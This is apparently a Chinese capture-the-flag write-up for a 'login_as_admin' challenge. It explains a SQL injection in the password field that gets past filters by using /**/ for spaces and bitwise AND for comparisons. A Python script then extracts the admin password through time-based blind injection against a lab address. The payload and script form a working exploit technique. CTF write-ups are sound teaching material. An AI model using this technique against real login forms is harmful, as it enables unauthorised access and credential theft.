login_as_admin

username参数必须为admin，password参数存在注入，过滤了空格，可用/**/代替，过滤了<、>、=可用与运算来注入。得出admin用户的密码，登录即可得flag。

脚本

import requests
import time
def and_operation():
    url = "http://172.16.9.2:9006/index.php"
    flag_payload = "1'/**/or/**/if((ascii(substr(password,{0},1))&{1}),sleep(2),1)/**/#"
    info = ""
    for j in range(1, 33):
        value = 0
        for k in range(7):
            payload = flag_payload.format(j, 2 ** k)
            data = {
                "username": "admin",
                "password": payload
            }
            start_time=time.time()
            res = requests.post(url=url, data=data)
            end_time=time.time()
            spend_time=end_time-start_time
            if spend_time>2:
                value = value + (2 ** k)
        if value == 0:
            break
        info = info + chr(value)
        print(info)


if __name__ == "__main__":
    and_operation()
